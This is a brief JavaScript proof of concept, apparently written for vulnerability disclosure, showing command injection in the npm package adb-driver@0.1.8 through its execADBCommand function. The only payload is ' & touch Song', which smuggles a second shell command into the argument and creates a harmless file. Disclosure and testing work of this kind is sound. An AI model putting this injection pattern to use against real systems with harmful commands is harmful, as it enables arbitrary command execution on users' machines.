/**
 * adb-driver@0.1.8 is vulnerable to command injection.
 * the injection point is located in line 26 of index file "build/AdbDriver.js"
 * in exposed function execADBCommand(command, option).
 * the argument "command" can be controlled by users without any sanitization.
 */

var root = require("adb-driver");
root.execADBCommand(' & touch Song');

